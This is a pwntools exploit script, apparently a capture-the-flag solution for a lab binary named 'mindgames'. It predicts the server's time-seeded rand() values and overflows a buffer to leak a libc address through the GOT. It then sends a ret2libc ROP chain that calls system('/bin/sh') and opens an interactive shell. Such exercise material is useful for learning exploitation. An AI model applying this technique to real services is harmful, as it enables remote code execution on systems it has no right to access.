from pwn import *
from re import findall
from datetime import datetime
from ctypes import CDLL
# from pwnscripts import *

# exe = context.binary = ELF(args.EXE or './mindgames-1336')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([io.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([io.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

context.log_level = 'debug'
context.terminal = '/bin/sh'
# context.aslr = False
context.arch = 'amd64'
context.os = 'linux'

# p = process()
p = remote("mindgames.secenv", 1336)   # getting remote connection

#============== getting the seed of srand ===================

strdate = re.findall(b"[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}", p.recvline())[0].decode()
epoch = datetime.strptime(strdate+'-+0000',"%Y-%m-%d %H:%M:%S-%z").timestamp()

#using above we will get the local time from screen 2024-05-19 11:53:59

print(strdate)
print("Timer = ", int(epoch) - 18000)  # after that we will give it to srand

C = CDLL('libc.so.6')
# C.srand(int(epoch) - 18000)
C.srand(int(epoch))   # epoch is conating the same number as timer
# randv = C.rand()

libc = ELF('libc.so.6')

randval = C.rand()
print("The first random value is", (randval % 32) + 1)
# print("2nd rand val", (C.rand() % 32) + 1)
highscore = (C.rand() % 32) + 1
print("Highscore = ", highscore)   # this is the same highscore

# gdb.attach(p)

randomval3 = C.rand()
print("3rd random val = ", (randomval3 % 32) + 1)

#===================== bypassing random number guess ===================

p.sendlineafter('> '.encode(), str(2).encode())   # after this i will give random values
p.sendlineafter('> '.encode(), str(randomval3).encode())
for i in range(highscore):                       # then i will create a loop which give some random values until we meet our reqiurement of calling vuln function
    p.sendlineafter('>'.encode(), str(C.rand()).encode())
p.sendlineafter('>'.encode(), str('1234').encode())  # then we give a false value to terminate loop

# C.rand()

#======================== overwriting new_name pointer with puts got =================

# now vuln funciton called we will give payload

import struct
integer_value = 12
integer_bytes = struct.pack("<Q", integer_value)

junk = b'A' * 32
cjunk = integer_bytes
p.sendlineafter('name: '.encode(), junk + cjunk + p64(0x404020))
# this is the payload we give we will what it does

# gdb.attach(p)

#==================== getting the leaked libc address =====================

p.sendlineafter('> '.encode(), str(1).encode())   # now i will call 1 and calls show_highscore 
p.recvuntil("highscore:\n".encode())
print(p.recvuntil(b"\t by \t"))

leaked_addr = unpack(p.recvuntil(b"\n")[1:-1].ljust(8, b'\x00'))  # it will leak got values
# extracted_bytes = leaked_addr[-1:-1]

#================= Finding libc base_address for ret2libc ==============

print("Leaked ADDR = ", hex(leaked_addr))
print("Puts offset in libc = ", hex(libc.symbols['puts']))
libc_base = leaked_addr  - libc.sym.puts    # subtracting got offset from leaked address
# libc_base = leaked_addr  - 0x83630
print("Libc Base addr = ", hex(libc_base))   # getting libc_base leak

#================== Now we will bypass NX bit ========================

rop = ROP(libc)
junkthistime = b'A' * 280   
ret = libc_base + rop.find_gadget(["ret"]).address
pop_rdi_ret = libc_base + rop.find_gadget(["pop rdi", "ret"]).address
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols["system"]
exit  = libc_base + libc.symbols["exit"]

payload = flat(junkthistime, ret, pop_rdi_ret, bin_sh, system, exit)

# gdb.attach(p)

#===================== bypassing random number guess ===================

p.sendlineafter('> '.encode(), str(2).encode())
C.rand()
p.sendlineafter('> '.encode(), str(C.rand()).encode())
for i in range(highscore):
    p.sendlineafter('>'.encode(), str(C.rand()).encode())
p.sendlineafter('>'.encode(), str('1234').encode())

# print(p.recv())

#=================== Sending the ret2libc payload created above =================

p.sendlineafter(b"name: ", payload)
p.interactive()

# pid = util.proc.pidof(p)
# print(f"pid  = {pid}")
# util.proc.wait_for_debugger(pid)

#########################################################